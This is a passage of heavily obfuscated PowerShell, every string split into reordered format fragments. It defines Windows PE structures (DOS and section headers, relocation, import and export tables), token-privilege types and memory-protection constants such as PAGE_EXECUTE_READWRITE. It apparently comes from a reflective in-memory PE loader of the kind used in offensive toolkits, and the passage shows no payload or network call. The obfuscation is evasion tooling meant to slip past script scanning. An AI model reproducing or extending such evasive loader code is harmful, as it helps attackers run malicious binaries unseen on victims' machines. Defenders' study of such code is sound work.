		${T`yp`eb`UILDEr}.("{1}{0}{2}{3}"-f 'e','D','fine','Field').Invoke(("{1}{0}" -f'blp','e_c'), [UInt16], ("{1}{0}"-f 'blic','Pu')) | &("{2}{1}{0}"-f 'ull','t-N','Ou')
		${T`Ype`BU`ilDer}.("{2}{0}{1}" -f 'e','ld','DefineFi').Invoke(("{0}{1}" -f 'e','_cp'), [UInt16], ("{0}{1}"-f'Pub','lic')) | &("{1}{0}{2}"-f '-Nu','Out','ll')
		${TypE`BU`Ilder}.("{0}{2}{1}" -f'D','fineField','e').Invoke(("{0}{1}" -f'e_c','rlc'), [UInt16], ("{0}{1}" -f'Pub','lic')) | &("{1}{0}{2}"-f 'Nu','Out-','ll')
		${T`YpeBu`ILd`ER}.("{0}{1}{2}" -f'D','efineF','ield').Invoke(("{1}{0}"-f'arhdr','e_cp'), [UInt16], ("{1}{0}" -f 'c','Publi')) | &("{1}{0}{2}"-f 'l','Out-Nu','l')
		${typ`EBu`IlDEr}.("{0}{1}{2}"-f 'D','efineFiel','d').Invoke(("{0}{2}{1}"-f 'e','minalloc','_'), [UInt16], ("{0}{1}" -f'Publi','c')) | &("{1}{0}" -f 'll','Out-Nu')
		${ty`pEB`UiLDer}.("{0}{1}{2}"-f 'DefineF','i','eld').Invoke(("{1}{0}{2}"-f 'xall','e_ma','oc'), [UInt16], ("{1}{0}" -f'c','Publi')) | &("{1}{0}{2}"-f'-','Out','Null')
		${TYp`EBU`ild`Er}.("{1}{0}{2}"-f 'e','D','fineField').Invoke(("{1}{0}" -f'_ss','e'), [UInt16], ("{0}{1}"-f 'Pu','blic')) | &("{2}{1}{0}" -f 'll','ut-Nu','O')
		${TYpEBUi`L`DeR}.("{2}{1}{0}" -f 'fineField','e','D').Invoke(("{0}{1}" -f'e_s','p'), [UInt16], ("{1}{2}{0}" -f'c','Pub','li')) | &("{0}{1}" -f 'Out-','Null')
		${tyPEbU`Il`D`ER}.("{2}{1}{0}"-f'Field','e','Defin').Invoke(("{0}{1}" -f'e_csu','m'), [UInt16], ("{2}{1}{0}" -f'c','li','Pub')) | &("{2}{0}{1}"-f 'ut-Nu','ll','O')
		${T`Y`P`eBUILDER}.("{1}{3}{0}{2}"-f'in','De','eField','f').Invoke(("{1}{0}" -f'p','e_i'), [UInt16], ("{0}{1}" -f 'Publi','c')) | &("{2}{1}{0}"-f 'l','-Nul','Out')
		${typ`ebU`IldEr}.("{2}{0}{1}"-f 'ineFi','eld','Def').Invoke(("{1}{0}"-f'_cs','e'), [UInt16], ("{0}{1}" -f'Publi','c')) | &("{2}{0}{1}" -f'ut','-Null','O')
		${Ty`pEBu`ILDER}.("{3}{2}{0}{1}"-f 'l','d','ineFie','Def').Invoke(("{1}{0}{2}" -f 'rl','e_lfa','c'), [UInt16], ("{1}{0}"-f 'blic','Pu')) | &("{1}{0}"-f 'ull','Out-N')
		${tyPEbu`il`d`ER}.("{2}{0}{1}" -f 'efine','Field','D').Invoke(("{1}{0}"-f'vno','e_o'), [UInt16], ("{0}{1}{2}" -f'Pu','bl','ic')) | &("{0}{1}{2}"-f'O','ut-','Null')

		${e_r`esf`IeLD} = ${Ty`peb`UIld`er}.("{0}{2}{1}" -f'D','neField','efi').Invoke(("{1}{0}" -f 's','e_re'), [UInt16[]], ("{4}{3}{0}{5}{2}{1}"-f'HasFieldMa','al','h',' ','Public,','rs'))
		${CO`NStRUC`ToRV`ALue} =   ( gCi  ('va'+'riaBLe:ru'+'8')).vAluE::"BYV`ALa`RRAy"
		${fI`e`lDarray} = @( ( Gi  ("VA"+"rI"+"abL"+"e:oaE") ).vAlUe.("{2}{1}{0}"-f 'd','Fiel','Get').Invoke(("{2}{0}{1}" -f 'izeCon','st','S')))
		${a`TtRIBbUI`l`DEr} = &("{1}{2}{0}" -f'ect','New-Ob','j') ("{7}{4}{5}{1}{6}{2}{3}{0}" -f 'uteBuilder','it.','r','ib','em.Re','flection.Em','CustomAtt','Syst')(${Co`Ns`TR`Uc`Tor`infO}, ${c`On`strUc`T`oRvAlue}, ${fi`el`DARr`AY}, @([Int32] 4))
		${e`_resF`I`eLD}.("{3}{2}{0}{1}"-f 'ribu','te','tCustomAtt','Se').Invoke(${a`TtRI`BBuilDeR})

		${TyP`Ebu`ilDeR}.("{2}{0}{1}"-f'neFi','eld','Defi').Invoke(("{0}{2}{1}"-f 'e_o','id','em'), [UInt16], ("{0}{2}{1}"-f 'P','blic','u')) | &("{0}{2}{1}"-f 'Ou','Null','t-')
		${TYpE`BuI`lDER}.("{2}{3}{0}{1}" -f'Fie','ld','De','fine').Invoke(("{1}{0}" -f 'eminfo','e_o'), [UInt16], ("{2}{0}{1}"-f'u','blic','P')) | &("{0}{2}{1}" -f'O','t-Null','u')

		${e`_re`S2fIEld} = ${tyPebU`i`l`DEr}.("{0}{2}{1}"-f'De','ield','fineF').Invoke(("{1}{0}" -f 'res2','e_'), [UInt16[]], ("{4}{0}{1}{6}{5}{2}{3}" -f'ic, HasFi','e','ha','l','Publ','Mars','ld'))
		${coN`STruC`TO`Rv`ALUE} =   (VAriabLE  ru8  -VaLu )::"ByV`AlAR`RaY"
		${At`TRi`BbUILdEr} = &("{0}{1}{3}{2}"-f'Ne','w-O','ect','bj') ("{6}{7}{2}{8}{5}{4}{3}{0}{1}{9}{10}{11}"-f't','ribu','on','mAt','to','.Cus','Sys','tem.Reflecti','.Emit','teB','uilde','r')(${COn`STRuCto`R`In`FO}, ${coN`s`TRUc`TorvaL`Ue}, ${F`i`eldarr`Ay}, @([Int32] 10))
		${e`_`Res2f`iELD}.("{0}{3}{1}{4}{2}" -f'S','Custo','ute','et','mAttrib').Invoke(${a`Tt`RIBbuiLDEr})

		${tYpe`BU`ILDEr}.("{0}{1}{2}" -f'Defin','eFie','ld').Invoke(("{2}{1}{0}" -f 'ew','_lfan','e'), [Int32], ("{0}{1}"-f'Pu','blic')) | &("{1}{0}" -f'-Null','Out')
		${iM`AG`e_D`Os`_heAder} = ${ty`P`Eb`UIlDEr}.("{0}{1}{2}"-f'Cre','at','eType').Invoke()	
		${WiN32`T`Y`PES} | &("{0}{1}{2}" -f 'Add-Me','mb','er') -MemberType ("{3}{0}{2}{1}"-f'rop','y','ert','NoteP') -Name ("{0}{2}{3}{1}" -f 'IMAG','_HEADER','E_','DOS') -Value ${i`Ma`Ge_`dOs_He`AdER}

		
		${a`TtRIBU`T`Es} = ("{0}{6}{10}{11}{1}{9}{2}{12}{8}{5}{7}{4}{3}"-f 'A','lass','c,','it','eFieldIn','Layout, S','utoLa','ealed, Befor','ial',', Class, Publi','yout, An','siC',' Sequent')
		${typEb`UI`L`deR} = ${mOdUle`BuI`Ld`ER}.("{2}{1}{3}{0}"-f'ype','ine','Def','T').Invoke(("{0}{2}{3}{1}" -f'IMAGE_','ON_HEADER','SEC','TI'), ${aTTr`iB`UTeS}, [System.ValueType], 40)

		${nameFI`e`lD} = ${TYpeB`UIlD`eR}.("{1}{0}{2}"-f'F','Define','ield').Invoke(("{0}{1}" -f'Nam','e'), [Char[]], ("{1}{3}{2}{0}{4}" -f'a','Publ','asFieldMarsh','ic, H','l'))
		${cONS`TruCtor`Va`LUE} =  (  gET-vAriaBle  ru8 ).VALUe::"BY`VAL`A`RraY"
		${A`T`TribBUiL`der} = &("{2}{0}{1}"-f 'ec','t','New-Obj') ("{6}{0}{10}{1}{5}{9}{13}{11}{7}{12}{3}{8}{4}{2}" -f'stem.Refle','tion.','ilder','ribu','Bu','Em','Sy','to','te','i','c','us','mAtt','t.C')(${CO`NSt`RUCToR`INFO}, ${consTruct`O`R`VAL`UE}, ${fIe`LDa`RraY}, @([Int32] 8))
		${name`Fi`eld}.("{0}{3}{2}{1}"-f 'Set','tribute','mAt','Custo').Invoke(${ATtriBbUIL`d`ER})

		${tYpeB`UIlD`er}.("{3}{2}{1}{0}"-f 'd','l','ie','DefineF').Invoke(("{0}{1}{2}"-f'V','irtualSiz','e'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{1}{2}{0}"-f'l','Out','-Nul')
		${TYp`EBui`ld`er}.("{2}{1}{0}"-f'ield','fineF','De').Invoke(("{2}{1}{0}"-f 's','alAddres','Virtu'), [UInt32], ("{2}{1}{0}"-f 'ic','bl','Pu')) | &("{1}{0}{2}"-f 'u','O','t-Null')
		${TY`PEBU`Il`deR}.("{1}{0}{2}{3}"-f 'ine','Def','Fiel','d').Invoke(("{0}{2}{3}{1}" -f'Siz','wData','eOfR','a'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{2}{1}" -f'Out-','l','Nul')
		${TyPE`BUi`ldeR}.("{2}{0}{1}"-f 'Fi','eld','Define').Invoke(("{2}{1}{3}{0}" -f'awData','oi','P','nterToR'), [UInt32], ("{0}{1}" -f 'Publ','ic')) | &("{1}{0}{2}" -f't-Nu','Ou','ll')
		${T`yPEB`U`Ilder}.("{1}{3}{0}{2}"-f'e','De','ld','fineFi').Invoke(("{3}{2}{4}{5}{0}{1}"-f'oReloca','tions','o','P','i','nterT'), [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{0}{1}"-f'Out-Nu','ll')
		${TyP`e`BUiLDER}.("{0}{1}{2}{3}" -f 'D','e','fineFiel','d').Invoke(("{0}{1}{3}{2}"-f'Poi','nterToL','numbers','ine'), [UInt32], ("{2}{0}{1}"-f 'u','blic','P')) | &("{0}{2}{1}" -f 'O','ull','ut-N')
		${t`Y`Peb`UIldER}.("{1}{2}{0}"-f 'ld','DefineFi','e').Invoke(("{0}{3}{2}{1}{4}"-f 'Numbe','e','fR','rO','locations'), [UInt16], ("{1}{0}" -f'c','Publi')) | &("{0}{1}" -f'Out-','Null')
		${ty`P`ebUILd`ER}.("{1}{0}{2}"-f'efineFie','D','ld').Invoke(("{3}{4}{1}{2}{0}" -f'rs','fLinenu','mbe','Numb','erO'), [UInt16], ("{1}{0}"-f 'ublic','P')) | &("{2}{0}{1}"-f 'ut-','Null','O')
		${TyP`EBUiLd`ER}.("{2}{1}{0}"-f 'Field','fine','De').Invoke(("{3}{0}{2}{1}"-f'ha','acteristics','r','C'), [UInt32], ("{2}{0}{1}"-f'b','lic','Pu')) | &("{1}{0}" -f '-Null','Out')
		${im`Age_SE`CtIOn_H`EaDeR} = ${TypE`BU`iLd`er}.("{2}{0}{1}"-f'reateTyp','e','C').Invoke()
		${WIn`32T`y`pes} | &("{0}{1}{2}" -f'Ad','d','-Member') -MemberType ("{2}{0}{1}"-f 'tePro','perty','No') -Name ("{2}{1}{3}{0}" -f'R','TION_HEAD','IMAGE_SEC','E') -Value ${imAGE`_`seC`TioN`_He`AdER}

		
		${a`TTR`ibUT`es} = ("{14}{10}{3}{19}{4}{8}{9}{12}{18}{16}{21}{13}{11}{1}{7}{5}{17}{15}{2}{0}{6}{20}"-f'Sealed, Bef','nti','t, ','oLa',', An','lLa','oreFieldIn','a','siClass,',' ','ut','ue','C','blic, Seq','A','u','ss,','yo','la','yout','it',' Pu')
		${t`Yp`ebuil`Der} = ${moDUL`e`BUI`ldEr}.("{2}{0}{1}"-f'efi','neType','D').Invoke(("{3}{2}{4}{1}{0}{5}"-f'CAT','_RELO','MAG','I','E_BASE','ION'), ${AttriB`Ut`eS}, [System.ValueType], 8)
		${TyPeb`U`iLder}.("{1}{0}{2}" -f 'fineFi','De','eld').Invoke(("{2}{3}{0}{1}" -f 'dres','s','Vir','tualAd'), [UInt32], ("{0}{1}"-f 'Publ','ic')) | &("{0}{1}"-f 'O','ut-Null')
		${tYpE`BuiL`deR}.("{2}{1}{3}{0}" -f 'd','Fie','Define','l').Invoke(("{0}{2}{1}" -f'Siz','ock','eOfBl'), [UInt32], ("{0}{1}"-f 'P','ublic')) | &("{2}{0}{1}" -f 'ut-Nu','ll','O')
		${iMagE_BAS`E`_r`El`oCA`TIon} = ${tYpe`BUiLD`Er}.("{2}{1}{0}"-f 'ype','eT','Creat').Invoke()
		${WI`N3`2Typ`es} | &("{3}{2}{0}{1}" -f 'Membe','r','-','Add') -MemberType ("{0}{2}{1}" -f'No','roperty','teP') -Name ("{3}{5}{0}{4}{1}{2}" -f 'SE','E','LOCATION','IMAG','_R','E_BA') -Value ${iMage_BASE_`R`elocAT`I`ON}

		
		${AtTR`iB`UT`eS} = ("{3}{1}{12}{2}{13}{7}{11}{8}{4}{5}{9}{10}{6}{0}"-f 'ldInit','utoLa','AnsiC','A','out, Se','aled,','ie','ubl','quentialLay',' B','eforeF','ic, Se','yout, ','lass, Class, P')
		${TypeBU`iL`D`er} = ${M`Od`Ul`EB`UIlder}.("{0}{1}{2}" -f'Def','ine','Type').Invoke(("{1}{2}{4}{6}{5}{0}{3}"-f 'T_D','IMA','GE','ESCRIPTOR','_','MPOR','I'), ${At`Tr`IbUT`es}, [System.ValueType], 20)
		${tYpeB`U`iLdEr}.("{1}{2}{0}{3}" -f 'Fie','D','efine','ld').Invoke(("{0}{2}{1}{3}"-f'Cha','cte','ra','ristics'), [UInt32], ("{1}{0}" -f'lic','Pub')) | &("{0}{1}{2}"-f 'O','u','t-Null')
		${TyPeBU`Ild`er}.("{1}{0}{3}{2}" -f'ef','D','eField','in').Invoke(("{1}{0}{2}"-f'am','TimeDateSt','p'), [UInt32], ("{1}{0}" -f'c','Publi')) | &("{1}{2}{0}" -f'ull','O','ut-N')
		${tYPe`B`UilDer}.("{2}{1}{0}" -f 'ld','eFie','Defin').Invoke(("{1}{2}{0}{3}"-f 'Cha','Forwarde','r','in'), [UInt32], ("{1}{2}{0}"-f 'blic','P','u')) | &("{2}{0}{1}" -f'u','ll','Out-N')
		${tY`pE`Buil`DeR}.("{2}{3}{1}{0}" -f 'ield','F','Defi','ne').Invoke(("{1}{0}"-f 'ame','N'), [UInt32], ("{1}{0}"-f'ublic','P')) | &("{2}{0}{1}"-f'N','ull','Out-')
		${t`y`Peb`Uilder}.("{2}{1}{0}" -f 'ield','F','Define').Invoke(("{1}{0}{2}" -f 'irstThun','F','k'), [UInt32], ("{0}{1}"-f'Pu','blic')) | &("{2}{0}{1}" -f't-N','ull','Ou')
		${imA`GE_i`MPoR`T_DEScRipT`oR} = ${Ty`p`eBUI`LDer}.("{3}{2}{0}{1}"-f'Typ','e','te','Crea').Invoke()
		${wi`N32t`YP`ES} | &("{2}{1}{0}" -f 'Member','-','Add') -MemberType ("{1}{0}{2}{3}"-f'oteProp','N','ert','y') -Name ("{2}{4}{1}{0}{3}"-f 'DESCRI','T_','IMAGE','PTOR','_IMPOR') -Value ${imA`ge_imPo`Rt`_d`eSc`RIpt`Or}

		
		${At`TRi`BUT`ES} = ("{11}{13}{17}{14}{3}{4}{2}{5}{6}{0}{10}{8}{9}{15}{1}{16}{12}{7}" -f 'tialL',' Befo','ss, Pu','si','Class, Cla','blic, Sequ','en','FieldInit','out',', Seal','ay','Au','e','toLayout, ','n','ed,','r','A')
		${t`yPE`Bui`lDEr} = ${ModUl`ebuil`DEr}.("{0}{2}{1}" -f'DefineTy','e','p').Invoke(("{4}{5}{1}{3}{2}{0}"-f 'Y','EX','TOR','PORT_DIREC','IMAGE','_'), ${A`TTRi`B`UTEs}, [System.ValueType], 40)
		${T`YPeBU`ilD`Er}.("{2}{0}{1}" -f'iel','d','DefineF').Invoke(("{4}{0}{2}{3}{1}" -f 'ac','stics','t','eri','Char'), [UInt32], ("{0}{1}" -f 'P','ublic')) | &("{1}{0}{2}"-f'ut-N','O','ull')
		${Ty`PE`BU`iLder}.("{0}{3}{2}{1}"-f'Defin','eld','Fi','e').Invoke(("{2}{1}{0}" -f'eStamp','t','TimeDa'), [UInt32], ("{1}{0}" -f 'c','Publi')) | &("{1}{2}{0}"-f 'll','O','ut-Nu')
		${TYpe`B`UIL`dER}.("{2}{1}{0}"-f 'ield','neF','Defi').Invoke(("{1}{2}{0}{3}"-f 'i','MajorV','ers','on'), [UInt16], ("{1}{2}{0}" -f'ic','P','ubl')) | &("{0}{2}{1}"-f 'O','ull','ut-N')
		${tyPe`B`UilD`eR}.("{2}{0}{1}{3}"-f 'f','i','De','neField').Invoke(("{0}{1}{2}{3}" -f'M','ino','rV','ersion'), [UInt16], ("{0}{2}{1}"-f 'Pu','lic','b')) | &("{2}{0}{1}"-f'Nu','ll','Out-')
		${Ty`PE`BUIlD`eR}.("{0}{1}{2}"-f 'DefineF','i','eld').Invoke(("{1}{0}"-f'ame','N'), [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{0}{2}{1}"-f'Out-','l','Nul')
		${TyPe`Bui`ld`eR}.("{0}{1}{2}"-f'Def','ine','Field').Invoke(("{1}{0}" -f 'se','Ba'), [UInt32], ("{2}{1}{0}"-f'lic','ub','P')) | &("{0}{2}{1}"-f 'Ou','-Null','t')
		${TyP`EbUIL`DeR}.("{2}{0}{1}" -f 'efin','eField','D').Invoke(("{1}{4}{3}{2}{0}" -f 'nctions','Num','OfFu','r','be'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{0}{2}{1}"-f 'Ou','ll','t-Nu')
		${type`B`UILd`eR}.("{0}{2}{1}{3}" -f'De','neFie','fi','ld').Invoke(("{0}{2}{1}"-f 'Numbe','mes','rOfNa'), [UInt32], ("{1}{0}" -f'lic','Pub')) | &("{2}{0}{1}"-f'l','l','Out-Nu')
		${typ`E`Bu`iLdeR}.("{1}{3}{0}{2}"-f 'ineF','D','ield','ef').Invoke(("{0}{4}{1}{2}{3}" -f'Address','unc','t','ions','OfF'), [UInt32], ("{1}{0}{2}"-f 'bl','Pu','ic')) | &("{1}{0}{2}" -f't-Nul','Ou','l')
		${TYP`EBUi`L`DER}.("{1}{2}{0}"-f'neField','D','efi').Invoke(("{2}{3}{0}{1}" -f 'N','ames','Address','Of'), [UInt32], ("{0}{1}"-f'Pu','blic')) | &("{1}{0}{2}" -f'Nu','Out-','ll')
		${tYpEB`UIl`DEr}.("{0}{1}{2}"-f 'De','fineFie','ld').Invoke(("{4}{1}{2}{3}{0}"-f's','ress','OfNameOrd','inal','Add'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{1}{0}{2}" -f '-Nu','Out','ll')
		${i`m`Age_ExP`o`Rt_DIRectory} = ${T`yPEbui`LDer}.("{1}{2}{0}" -f 'eateType','C','r').Invoke()
		${W`iN`32typeS} | &("{0}{1}{2}" -f 'Ad','d-Me','mber') -MemberType ("{0}{1}{2}" -f'No','teProp','erty') -Name ("{2}{6}{3}{4}{0}{5}{1}"-f'_EXPOR','CTORY','I','AG','E','T_DIRE','M') -Value ${I`mAGe_EX`POrt`_`Dir`e`cTOrY}
		
		
		${a`T`TriBut`eS} = ("{11}{4}{9}{12}{7}{16}{8}{5}{2}{3}{1}{6}{15}{10}{14}{13}{0}"-f'it','ayou','Sequen','tialL','uto','Class, Public, ','t, Sealed,','t, ','lass, ','L','reFi','A','ayou','ldIn','e',' Befo','AnsiC')
		${type`B`UI`Lder} = ${mOD`U`LEBuIl`D`Er}.("{1}{2}{3}{0}"-f 'pe','D','ef','ineTy').Invoke(("{1}{0}" -f 'ID','LU'), ${atTri`B`U`TeS}, [System.ValueType], 8)
		${t`YpeBuILd`ER}.("{1}{2}{0}"-f 'd','D','efineFiel').Invoke(("{1}{0}"-f'owPart','L'), [UInt32], ("{1}{2}{0}"-f 'c','Publ','i')) | &("{0}{1}{2}" -f 'O','u','t-Null')
		${tYPE`BU`ILd`eR}.("{0}{2}{1}"-f'Def','Field','ine').Invoke(("{1}{0}" -f 'ghPart','Hi'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{2}{1}" -f'Out-N','ll','u')
		${Lu`Id} = ${ty`pEbuIl`D`Er}.("{2}{0}{1}" -f'ateT','ype','Cre').Invoke()
		${win`32ty`pES} | &("{1}{0}{2}"-f'e','Add-M','mber') -MemberType ("{0}{2}{3}{1}"-f'No','rty','teP','rope') -Name ("{0}{1}" -f 'LU','ID') -Value ${L`Uid}
		
		
		${aTtrIB`U`TES} = ("{11}{3}{0}{7}{4}{6}{13}{12}{9}{10}{5}{8}{1}{2}"-f 'yout, AnsiC','ield','Init','La','ass,','d,',' Class, ','l',' BeforeF','entialLayout',', Seale','Auto','u','Public, Seq')
		${tYpE`BuiL`D`ER} = ${MoDUL`e`BuIl`dER}.("{2}{0}{3}{1}"-f 'ef','pe','D','ineTy').Invoke(("{3}{2}{1}{0}" -f'BUTES','D_ATTRI','N','LUID_A'), ${ATtrib`U`TeS}, [System.ValueType], 12)
		${T`Y`pebuIlD`er}.("{1}{0}{2}{3}" -f'efin','D','e','Field').Invoke(("{0}{1}" -f'Lu','id'), ${L`UId}, ("{1}{0}" -f 'blic','Pu')) | &("{0}{2}{1}" -f'Out-N','l','ul')
		${ty`P`eBUIL`dER}.("{0}{1}{2}" -f 'DefineF','iel','d').Invoke(("{2}{0}{1}" -f'but','es','Attri'), [UInt32], ("{1}{0}" -f'ic','Publ')) | &("{1}{0}{2}" -f 't-N','Ou','ull')
		${Lui`D_aND_At`Tr`IbuteS} = ${T`Yp`eBUi`ldEr}.("{2}{1}{0}"-f 'ype','ateT','Cre').Invoke()
		${w`IN32T`YpeS} | &("{0}{1}{2}"-f 'Add-Me','mb','er') -MemberType ("{0}{1}{2}" -f'No','t','eProperty') -Name ("{1}{3}{2}{0}"-f 'ND_ATTRIBUTES','L','A','UID_') -Value ${LUid_a`Nd`_`ATTRIbuTeS}
		
		
		${A`TT`RIbuTeS} = ("{5}{9}{4}{6}{15}{7}{14}{17}{0}{21}{2}{8}{11}{13}{16}{1}{20}{19}{10}{12}{3}{18}" -f'Publi',' Seal',', Se','n','toL','A','ay','n','quentia','u','oreF','l','ieldI','Layout','siClass, Clas','out, A',',','s, ','it','d, Bef','e','c')
		${TY`Pe`B`UiLDeR} = ${mod`UL`E`BU`ILdEr}.("{0}{2}{1}"-f'De','pe','fineTy').Invoke(("{2}{0}{1}{5}{4}{3}"-f 'OK','E','T','IVILEGES','_PR','N'), ${aT`T`RIBUt`Es}, [System.ValueType], 16)
		${t`yPebU`iLd`eR}.("{1}{2}{0}"-f 'ld','DefineF','ie').Invoke(("{1}{2}{0}{3}"-f'geCoun','P','rivile','t'), [UInt32], ("{0}{1}"-f 'Pub','lic')) | &("{1}{0}"-f'Null','Out-')
		${tYP`EBu`ILD`Er}.("{2}{3}{0}{1}" -f 'neFie','ld','D','efi').Invoke(("{0}{2}{1}" -f 'P','ivileges','r'), ${lUiD`_`A`Nd_`AT`TRibUtES}, ("{2}{1}{0}" -f'c','ubli','P')) | &("{2}{0}{1}"-f 'u','ll','Out-N')
		${ToK`eN_p`RIvilE`GES} = ${T`y`pEBUi`LdeR}.("{0}{1}{2}"-f 'Cre','a','teType').Invoke()
		${wIN3`2Ty`peS} | &("{0}{1}{3}{2}" -f 'Add-','Me','r','mbe') -MemberType ("{2}{1}{3}{0}"-f 'ty','eP','Not','roper') -Name ("{2}{3}{1}{0}" -f 'S','N_PRIVILEGE','TOK','E') -Value ${TOke`N_pRiv`I`lEg`Es}

		return ${WI`N`32T`yPES}
	}

	Function GeT`-win3`2CoN`st`A`NTs
	{
		${w`In32CoN`s`TAnTS} = &("{1}{0}{2}{3}" -f '-','New','Ob','ject') ("{1}{2}{0}" -f'.Object','Sys','tem')
		
		${wIn32COns`Ta`Nts} | &("{1}{0}{2}"-f'd-Me','Ad','mber') -MemberType ("{0}{2}{3}{1}"-f'No','ty','teProp','er') -Name ("{2}{0}{1}"-f 'I','T','MEM_COMM') -Value 0x00001000
		${WIn`32C`onst`An`Ts} | &("{1}{0}{2}"-f'Memb','Add-','er') -MemberType ("{2}{1}{0}{3}"-f 'Prope','te','No','rty') -Name ("{2}{3}{1}{0}" -f'ERVE','_RES','M','EM') -Value 0x00002000
		${wIn3`2c`ON`stANTS} | &("{2}{1}{0}" -f 'er','b','Add-Mem') -MemberType ("{1}{2}{0}" -f 'y','NoteP','ropert') -Name ("{3}{2}{0}{1}"-f'CE','SS','OAC','PAGE_N') -Value 0x01
		${wIN3`2c`ONs`TANts} | &("{1}{0}{2}"-f'dd-Me','A','mber') -MemberType ("{2}{1}{0}"-f'y','Propert','Note') -Name ("{0}{2}{1}"-f 'PAGE_','EADONLY','R') -Value 0x02
		${W`in32CO`NS`Ta`NtS} | &("{1}{0}{2}"-f 'e','Add-Memb','r') -MemberType ("{0}{3}{1}{2}"-f 'Note','rope','rty','P') -Name ("{3}{1}{2}{0}" -f 'TE','GE','_READWRI','PA') -Value 0x04
		${w`in`32`COnStA`NTS} | &("{0}{1}{3}{2}"-f'A','d','-Member','d') -MemberType ("{1}{3}{2}{0}"-f 'operty','Not','r','eP') -Name ("{3}{2}{1}{0}{4}"-f'RIT','_W','E','PAG','ECOPY') -Value 0x08
		${win`32`Co`Ns`TAnTs} | &("{2}{3}{0}{1}"-f 'emb','er','A','dd-M') -MemberType ("{0}{2}{1}" -f 'NotePr','y','opert') -Name ("{0}{2}{1}"-f'PAG','UTE','E_EXEC') -Value 0x10
		${WiN`3`2CoNStaNts} | &("{1}{0}{2}" -f'dd-Mem','A','ber') -MemberType ("{2}{1}{0}"-f 'Property','ote','N') -Name ("{0}{1}{2}{3}"-f'P','AGE_EX','ECUTE_','READ') -Value 0x20
		${wiN3`2CoNst`AN`Ts} | &("{3}{0}{2}{1}"-f'd-','mber','Me','Ad') -MemberType ("{1}{0}{2}" -f 'op','NotePr','erty') -Name ("{6}{3}{0}{2}{1}{5}{4}"-f'E','DW','A','ECUTE_R','E','RIT','PAGE_EX') -Value 0x40
		${WiN3`2`con`S`TANtS} | &("{1}{0}{2}"-f'Memb','Add-','er') -MemberType ("{2}{1}{0}"-f'roperty','eP','Not') -Name ("{4}{3}{0}{1}{2}" -f 'E_WR','IT','ECOPY','ECUT','PAGE_EX') -Value 0x80
		${WIn32c`OnS`Ta`N`Ts} | &("{1}{2}{0}" -f 'er','Add-Mem','b') -MemberType ("{1}{0}{2}" -f'op','NotePr','erty') -Name ("{3}{0}{2}{1}" -f 'NOCA','HE','C','PAGE_') -Value 0x200
		${wIn`32`cO`NsTAnts} | &("{2}{0}{1}" -f'd-M','ember','Ad') -MemberType ("{2}{0}{3}{1}" -f 'te','perty','No','Pro') -Name ("{2}{4}{3}{1}{0}" -f'_ABSOLUTE','SED','IM','BA','AGE_REL_') -Value 0
		${WI`N32`CoNS`T`AntS} | &("{1}{2}{0}" -f 'ber','Add-M','em') -MemberType ("{2}{3}{1}{0}"-f 'erty','eProp','N','ot') -Name ("{3}{2}{1}{4}{5}{0}" -f 'OW','R','E_','IMAG','EL_BASED_HIG','HL') -Value 3
		${WIn`32CONst`ANts} | &("{2}{1}{0}"-f'mber','e','Add-M') -MemberType ("{1}{3}{2}{0}" -f'roperty','No','P','te') -Name ("{0}{2}{3}{1}{4}"-f 'I','A','MAGE_R','EL_B','SED_DIR64') -Value 10
		${W`IN3`2C`oNSTA`NtS} | &("{2}{1}{0}" -f 'r','-Membe','Add') -MemberType ("{0}{1}{2}" -f'Note','P','roperty') -Name ("{5}{1}{4}{0}{3}{2}"-f'N_MEM_DISC','E_S','RDABLE','A','C','IMAG') -Value 0x02000000
		${WIn3`2`CoNS`TAnTs} | &("{1}{0}{2}" -f'mbe','Add-Me','r') -MemberType ("{2}{1}{0}" -f 'rty','rope','NoteP') -Name ("{2}{3}{1}{5}{4}{0}"-f'ECUTE','N_ME','IMAGE_S','C','_EX','M') -Value 0x20000000
		${wIN3`2Con`sTA`Nts} | &("{2}{0}{1}" -f'dd-Mem','ber','A') -MemberType ("{2}{1}{0}" -f 'y','pert','NotePro') -Name ("{2}{4}{1}{3}{0}"-f'_READ','N_ME','IMAGE_S','M','C') -Value 0x40000000
		${Wi`N32c`onStANtS} | &("{0}{1}{2}"-f 'Add-Me','m','ber') -MemberType ("{2}{0}{1}{3}"-f 'r','t','NotePrope','y') -Name ("{4}{0}{3}{2}{1}{5}"-f 'M','M_W','ME','AGE_SCN_','I','RITE') -Value 0x80000000
		${WI`N32cO`N`s`TAnts} | &("{2}{0}{1}{3}"-f '-M','em','Add','ber') -MemberType ("{3}{1}{0}{2}" -f'rope','P','rty','Note') -Name ("{1}{6}{3}{4}{2}{5}{0}"-f'_CACHED','I','EM','GE_','SCN_M','_NOT','MA') -Value 0x04000000
		${W`iN32C`O`Ns`TaNts} | &("{1}{0}{2}"-f'-M','Add','ember') -MemberType ("{1}{2}{0}"-f 'rty','NoteP','rope') -Name ("{3}{2}{1}{0}" -f 'IT','DECOMM','_','MEM') -Value 0x4000
		${wiN32CoN`St`A`NtS} | &("{1}{0}{2}" -f'-Memb','Add','er') -MemberType ("{1}{0}{2}" -f 'opert','NotePr','y') -Name ("{6}{7}{2}{0}{4}{1}{5}{3}"-f 'EX','T','ILE_','E_IMAGE','ECU','ABL','IMAGE','_F') -Value 0x0002
		${wiN32`c`OnsTA`NTs} | &("{2}{0}{1}" -f 'Me','mber','Add-') -MemberType ("{1}{2}{0}"-f'operty','NoteP','r') -Name ("{3}{0}{4}{1}{2}" -f'AGE_FILE','D','LL','IM','_') -Value 0x2000
		${WiN`32`conSt`Ants} | &("{0}{1}{2}" -f 'A','dd','-Member') -MemberType ("{1}{0}{2}"-f'P','Note','roperty') -Name ("{0}{4}{5}{1}{2}{3}{8}{6}{7}"-f'I','HARAC','T','E','M','AGE_DLLC','ISTICS_DYN','AMIC_BASE','R') -Value 0x40
		${WIn3`2Con`sTANts} | &("{1}{2}{0}" -f'mber','A','dd-Me') -MemberType ("{1}{2}{0}{3}" -f 't','No','teProper','y') -Name ("{1}{2}{0}{4}{3}{5}"-f'LCHAR','IMAG','E_DL','CS','ACTERISTI','_NX_COMPAT') -Value 0x100
